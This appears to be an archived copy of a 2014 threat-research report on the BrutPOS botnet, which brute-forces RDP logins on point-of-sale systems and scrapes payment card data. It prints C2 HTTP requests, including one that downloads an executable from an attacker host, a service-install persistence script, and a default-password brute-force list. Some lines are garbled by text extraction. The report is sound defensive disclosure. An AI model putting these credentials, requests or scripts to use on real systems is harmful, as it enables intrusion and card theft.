{
    "id": "77f36d50-bf6f-4709-b11f-0e9a21df3d9d",
    "created_at": "2023-01-12T15:08:02.003723Z",
    "updated_at": "2025-03-27T02:05:46.269872Z",
    "deleted_at": null,
    "sha1_hash": "e46322849c81db8ae8fcae371c52fcc7f6033f4e",
    "title": "2014-07-09 - BrutPOS- RDP Bruteforcing Botnet Targeting POS Systems",
    "authors": "",
    "file_creation_date": "2022-05-29T01:12:50Z",
    "file_modification_date": "2022-05-29T01:12:50Z",
    "file_size": 887740,
    "plain_text": "# BrutPOS: RDP Bruteforcing Botnet Targeting POS Systems\n\n**[fireeye.com/blog/threat-research/2014/07/brutpos-rdp-bruteforcing-botnet-targeting-pos-systems.html](https://www.fireeye.com/blog/threat-research/2014/07/brutpos-rdp-bruteforcing-botnet-targeting-pos-systems.html)**\n\n## Threat Research Blog\n\nJuly 09, 2014 | by [Nart Villeneuve,](https://www.fireeye.com/blog/threat-research.html/category/etc/tags/fireeye-blog-authors/cap-narottama-villeneuve) [Kyle Wilhoit,](https://www.fireeye.com/blog/threat-research.html/category/etc/tags/fireeye-blog-authors/cap-kyle-wilhoit) [Joshua Homan](https://www.fireeye.com/blog/threat-research.html/category/etc/tags/fireeye-blog-authors/cap-joshua-homan)\nThere have been an increasing number of headlines about breaches at retailers in which attackers have made off with credit card data after\ncompromising point-of-sale (POS) terminals. However, what is not commonly discussed is the fact that one third of these breaches are a result\nof weak default passwords in the remote administration software that is typically installed on these systems. [1] While advanced exploits\ngenerate a lot of interest, sometimes it’s defending the simple attacks that can keep your company from the headlines.\n\nIn this report, we document a botnet that we call BrutPOS which uses thousands of compromised computers to scan specified IP address\nranges for RDP servers that have weak or default passwords in an effort to locate vulnerable POS systems. [2]\n\n**BrutPOS**\n\nIt is unclear exactly how the BrutPOS malware is being propagated. We have found that the malware is being distributed (along with a\nconsiderable amount of otherwise unrelated malware) by the site destre45[.]com. The attackers may have used a distribution service provided\nby other cybercriminals.\n\nWhen executed, the malware copies itself to:\n```\n\"%USERPROFILE%\\%APPDATA%\\llasc.exe\"\n\n```\n\nIt modifies the Windows Registry (HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Run_) so that it will be restarted after a reboot.\n\nThe malware connects to the command and control server (C2) to report its status and receives a list of usernames/passwords and IP\naddresses to begin scanning.\n```\nPOST /brut.loc/www/cmd.php HTTP/1.1\n\n```\n```\nContent-type: multipart/form-data, boundary=XyEgoZ17\nCache-Control: no-cache\n\n```\n```\nAccept: */*\nAccept-Encoding: identity\n\n```\n```\nConnection: Keep-Alive\nAccept-Language: ru-RU,en,*\n\n```\n```\nUser-Agent: Browser\nHost: 92.63.99.157\n\n```\n```\nContent-Length: 212\n\n```\n\n-----\n\ny go\n\ncontent-disposition: form-data; name=\"data\"\n\n{ \"bad\" : 0, \"bruting\" : false, \"checked\" : 1, \"done\" : true, \"errors\" : 0, \"good\" : 0, \"goodslist\" : \"\", \"pps\" : 0.0, \"threads\" : 5, \"v\" : \"0.0.0\" }\n\nHTTP/1.1 200 OK\n\nDate: Fri, 20 Jun 2014 13:22:53 GMT\n\nServer: Apache/2.2.22 (@RELEASE@)\n\nX-Powered-By: PHP/5.3.3\n\nSet-Cookie: PHPSESSID=o68hcjj8lhkbprfbdkbj50lrr0; path=/\n\nExpires: Thu, 19 Nov 1981 08:52:00 GMT\n\nCache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0\n\nPragma: no-cache\n\nContent-Length: 2056\n\nConnection: close\n\nContent-Type: text/html; charset=UTF-8\n\n{\"passwords\":\"backupexec\\r\\nbackup\\r\\npassword\\r\\nPassword1\\r\\nPassw0rd\\r\\nPa$$w0rd1\\r\\nPass@word\\r\\nPassword\\r\\nclient\\r\\nP@ssw0rd\\r\\\n\n[IP ADDRESSES REDACTED]\",\"botstart\":\"1\",\"stamp\":1308301912,\"newthreads\":5,\"interval\":50}\n\nThe infected system begins to make connections to port 3389; if the port is open it adds the IP to a list of servers to be brute forced with the\nsupplied credentials. If the infected system is able to successfully brute force an RDP server, it reports back with credentials.\n\nIn total we found five C2 servers used by the BrutPOS botnet. Three of these servers are located on the same network in Russia; one of them\nis located in Iran. Only two of these servers remain active at this time.\n\n**C2** **Country** **Network** **Status**\n\n62.109.16.195 62.109.16.195 Russia Russia THEFIRST-NET THEFIRST-NET Active Active\n\n92.63.99.157 92.63.99.157 Russia Russia THEFIRST-NET THEFIRST-NET Active Active\n\n78.154.54.42 78.154.54.42 Iran Iran BSG BSG Inactive Inactive\n\n82.146.34.22 82.146.34.22 Russia Russia THEFIRST-NET THEFIRST-NET Inactive Inactive\n\n62.113.208.37 62.113.208.37 Germany Germany DE-23MEDIA DE-23MEDIA Inactive Inactive\n\nBased on the compile times of the samples we analyzed that connect to this C2 infrastructure, this botnet was active as of February 2014.\n\nHowever, one of the active C2 servers was setup on May 28 and we believe that the second was setup in early June. We were able to recover\ninformation from these two C2 servers in mid-June that allowed us to gain a better understanding of this botnet.\n\nThe attackers are able to control the botnet from a web-based administration panel. This panel provides a statistical overview of the botnet.\n\n\n-----\n\nThe botnet had a total of 5622 compromised computers under its control, however, only a fraction of those systems are active at any given\ntime (179 were active when we last checked). This page also displays the “current version” of the malware and if an infected system checking\nin reports an earlier version a new executable will be pushed down to it.\n\n\n-----\n\ne attac e s a e ab e to e t e deta s o t e ected syste s u de t e co t o c ud g t e add ess a d geog ap c ocat o as e\nas status of the infected systems’ brute forcing activities (bad / good / errors / threads / version) and the timestamp of the last connection to the\nC2. The attackers may also specify commands such as “reload” and “delete”.\n\nBased on the IP addresses on this page, there are 5622 infected systems spread across 119 countries.\n\n**Country** **Count** **Percentage**\n\nRussia Russia 881 881 15.67% 15.67%\n\nIndia India 756 756 13.45% 13.45%\n\nVietnam Vietnam 422 422 7.51% 7.51%\n\nIran Iran 341 341 6.07% 6.07%\n\nTaiwan Taiwan 232 232 4.13% 4.13%\n\nUkraine Ukraine 151 151 2.69% 2.69%\n\nTurkey Turkey 139 139 2.47% 2.47%\n\nSerbia Serbia 115 115 2.05% 2.05%\n\nEgypt Egypt 110 110 1.96% 1.96%\n\nMexico Mexico 106 106 1.89% 1.89%\n\nThis page lists the ranges of IP addresses that the attackers can specify to be scanned for RDP access and brute forced.\n\n\n-----\n\nIn total, the attackers specified 57 IP address ranges the majority of which (32) are located in the U.S.\n\nThe attackers can specify the user names and passwords that the infected systems use to brute force available RDP servers. Some of the\nusernames and password indicate that the attackers are looking for specific brands of POS systems (such as Micros). [3]\n\n**Usernames** **Passwords**\n\nadmin admin Admin Admin\n\nadministrator administrator admin admin\n\nbackup backup Administrat0r Administrat0r\n\nbackupexec backupexec Administrator Administrator\n\ndata data administrator administrator\n\ndatacard datacard backup backup\n\nmanager manager backupexec backupexec\n\nmicros micros client client\n\nmicrossvc microssvc client1 client1\n\n\n-----\n\npos pos datacard datacard\n\n@dm1n @dm1n\n\n@dmin @dmin\n\nmicros micros\n\np0s p0s\n\nPassw0rd Passw0rd\n\nPassw0rd1 Passw0rd1\n\nPassword Password\n\nPass@word Pass@word\n\npassword password\n\nPassword1 Password1\n\nPa$$w0rd1 Pa$$w0rd1\n\nPa$$word Pa$$word\n\npa$$word pa$$word\n\npos pos\n\nP@ssw0rd P@ssw0rd\n\np@ssword p@ssword\n\np@ssword1 p@ssword1\n\np@$$w0rd p@$$w0rd\n\nWhen an infected system reports back a successful RDP login, the attackers store the username/password and IP address of the RDP server\nas well as the IP address of the infected system that successfully brute forced it.\n\n\n-----\n\nOf the 60 “good” RDP servers listed by the attackers the majority (51) are located in the U.S. The most common username was “administrator”\n(36) and the most common passwords were “pos” (12) and “Password1” (12).\n\n**Payment Card Theft**\n\nDuring our investigation, we discovered another executable that is potentially run on systems once credentials are obtained (e.g.\n4aed6a5897e9030f09f13f3c51668e92). This variant is intended to extract payment card information stored within running processes. It has\ntwo distinct code paths depending on its ability to get debug permissions by calling RtlAdjustPrivilage(0x14,1,0…). This may be an attempt to\nidentify a POS configuration. If it succeeds in getting debug permissions, it downloads the executable and executes it:\n```\nGET /brut.loc/www/bin/1.exe HTTP/1.1\n\n```\n```\nAccept-Encoding: gzip\nConnection: Keep-Alive\n\n```\n```\nAccept-Language: ru-RU,en,*\nUser-Agent: Browser\n\n```\n```\nHost: 82.146.34.22\n\n```\nIf the malware fails to get debug permissions, it copies itself to %WINDIR%\\lsass.exe and installs itself as a service. The following script is\nused to create and start the service:\n\n```\nsc create winserv binpath= C:\\WINDOWS\\lsass.exe type= own start= auto\nsc start winserv\n\n```\n```\ndel 1.bat\n\n```\nWhen running as a service, the program scans the memory of all processes with the exception of csrss.exe and conhost.exe for potential\npayment card information. Candidates are verified using the Luhn checksum and saved to winsrv.sys. It uploads ‘winsrv.sys’ using FTP to the\nserver 62.109.16.195.\n\nBefore connecting to the FTP server, the implant connects to smtp[.]gmail[.]com on port 25 and obtains the victim’s external IP address from\nthe EHLO response. winsrv.sys is uploaded to the FTP serving using a filename consisting of a capital character followed by the IP address.\nThe capital character prefixed to the filename is initialized to ‘A’ and is incremented through ‘Z’ for each new file. If the IP address isn’t obtained\nfrom smtp[.]gmail[.]com, a random four digit number is generated.\n\n**Attribution**\n\nWhile there is insufficient information to determine attribution, there is some information which indicates that the attackers are in Eastern\nEurope, probably Russia or Ukraine. In addition to the Russian language interface, we recovered web server logs and parsed out the six IP\naddresses that used the administration interface.\n\nTwo of the IP addresses were from PEOPLE-NET, an ISP in Ukraine. In both cases the “User-Agent” indicates that the requests were coming\nfrom an Alcatel mobile phone running Android:\n\n\n-----\n\n```\n        ( ; ; ) pp (, )\nChrome/32.0.1700.72 Mobile Safari/537.36 OPR/19.0.1340.69721\"\n\n```\nAnother Ukraine IP address, from the UKRTELNET-ADSL ISP, was also used. However, the “User-Agent” in this case was FireFox:\n```\n\"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0\"\n\n```\n\nThere were also connections from an IP range in Russia assigned to the network “Macroregional_South” in Volvograd.\n\nIn addition to these connections there were also connections from the U.K. and France, however, these connections were made using VPN\nservices provided by atomintersoft.com and vpnlux.net.\n\n**Honeypot**\n\nIn order to understand the attacker’s intentions, we decided to setup a Windows 2008 R2 Server with POS software and allow the attackers to\ncompromise it. In addition to POS software, we also put documents with fake credit card information on the Desktop. By mimicking the traffic\ngenerated by the infected systems under the attackers control, we were able send a username and password combination of “micros” and\n“admin” to the C2. We then waited for the attackers to connect.\n\nWe saw the attackers connect to the RDP instance 27 minutes after the fake username and password combination were sent to the C2. The\nattackers connected from three IP addresses. One of the IP addresses was in the same Ukrainian IP address range assigned to PEOPLE-NET\nthat we saw in the C2 logs. Another was the same VPN based in the UK, while the third was assigned to INETHN in Honduras.\n\nAfter connecting, the attackers immediately opened the document containing fake credit card information, then exited the system shortly after.\nThe second access attempt occurred 4 minutes later, with little activity. The third access occurred 18 minutes later. The attackers, on the third\naccess, then attempted to open the POS software; which was unsuccessful. The fourth access happened two minutes later, with very little\nactivity. The fifth and final access happened approximately 4 hours later, which led the attackers to format the drive, thus attempting to wipe\ndata trails.\n\n**Conclusion**\n\nPOS systems remain a high priority target for cybercriminals. Based on a simple scanning attack, the attackers in this case were able leverage\ntheir botnet of over 5000 machines in order to acquire access to 60 systems in two weeks.\n\nWhile new malware and more advanced attacks are taking place, standard attacks against weak passwords for remote administration tools\npresents a significant threat.\n\n**Notes**\n\n1. http://www2.trustwave.com/rs/trustwave/images/2014_Trustwave_Global_Security_Report.pdf\n\n2. The BrutPOS malware was initially identified in March 2014 but the full scope of the botnet was still unknown at that time.\nhttp://www.alienvault.com/open-threat-exchange/blog/botnet-bruteforcing-point-of-sale-via-remote-desktop and\nhttp://deepflash.blogspot.ca/2014/02/rdp-bruterforcer-in-wild.html\n\n3. Micros sells POS systems for the retail and hospitality industries http://www.micros.com/.\n\n**Acknowledgements**\n\nWe would like to thank Josh Gomez for his help and support.\n\n**Samples**\n\n4c3d65c1d8e1d7a2815c0031be41efc7: BrutePOS_Brute\n\n7391ff6f34f79df0ec7571f7afbf8f7a: BrutePOS_Brute\n\n280d920531ba67d8fd81350877914985: BrutePOS_Brute\n\n96487eb38687e84405f045f7ad8a115c: BrutePOS_Brute\n\nc1fab4a0b7f4404baf8eab4d58b1f821: BrutePOS_Brute\n\n6bcff459fbca8a64f1fd74be433e2450: BrutePOS_Brute\n\ndaae858fe34dcf263ef6230d887b111d: BrutePOS_Brute\n\n31bd8dd48ac0de3d4da340bf29f4d280: BrutePOS_Brute\n\n0f2266f63c06c0fee3ff999936c7c10a: BrutePOS_Brute\n\n4d4fd96fabb1c525eaeeae8f2652ffa6: BrutePOS Brute\n\n\n-----\n\nda6d dd 096b665 06 8 b d 6c ute OS_ ute\n\nfd58144a4cd354bfd09719ac2ccd3511: BrutePOS_Brute\n\ne38e42f20e027389a86d6a5816a6d8f8: BrutePOS_Brute\n\n08863d484b1ebe6359144c9a8d8027c0: BrutePOS_Brute\n\n4ab3a6394a3a1860a6c52cf92d7f7560: BrutePOS_Brute\n\n0e58848506a525c755cb0dad397c1c44: BrutePOS_Brute\n\n60c16d8596063f6ee0eae579f201ae04: BrutePOS_Brute\n\nb2d4fb4977630e68107ee87299a714e6: BrutePOS_Brute\n\n68ba1afd4585b9355cf7009f4604a208: BrutePOS_Brute\n\n9d3d769d3feea92fd4794fc3c59e32df: BrutePOS_Brute\n\nb63581fcf0ff86bb771c3c33205c78ca: BrutePOS_Brute\n\n18eba6f28ab6c088d9fc22b4cc154a77: BrutePOS_Brute\n\n4802539350908fd447a5c3ae3e966be0: BrutePOS_Brute\n\ncbbb68f6d8eda1071078a02fd79ed3ec: BrutePOS_Brute\n\n8ba3c7ccd0a61d5c9a8b94a71ce06328: BrutePOS_Brute\n\n9b8de98badede7f837a34e318b12d842: BrutePOS_Brute\n\n78f4a157db42321e8f61294bb39d7a74: BrutePOS_FTP_Exfil\n\nf36889f30b62a7524bafc766ed78b329: BrutePOS_FTP_Exfil\n\n95b13cd79621931288bd8a8614c8483f: BrutePOS_FTP_Exfil\n\n4aed6a5897e9030f09f13f3c51668e92: BrutePOS_FTP_Exfil\n\n06d8d8e18b91f301ac3fe6fa45ab7b53: BrutePOS_FTP_Exfil\n\nfaddbf92ab35e7c3194af4e7a689897c: BrutePOS_FTP_Exfil\n\nPrevious Post\nNext Post\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2014/2014-07-09 - BrutPOS- RDP Bruteforcing Botnet Targeting POS Systems.pdf"
    ],
    "report_names": [
        "2014-07-09 - BrutPOS- RDP Bruteforcing Botnet Targeting POS Systems.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673536082,
    "ts_updated_at": 1743041146,
    "ts_creation_date": 1653786770,
    "ts_modification_date": 1653786770,
    "files": {
        "pdf": "https://archive.orkl.eu/e46322849c81db8ae8fcae371c52fcc7f6033f4e.pdf",
        "text": "https://archive.orkl.eu/e46322849c81db8ae8fcae371c52fcc7f6033f4e.txt",
        "img": "https://archive.orkl.eu/e46322849c81db8ae8fcae371c52fcc7f6033f4e.jpg"
    }
}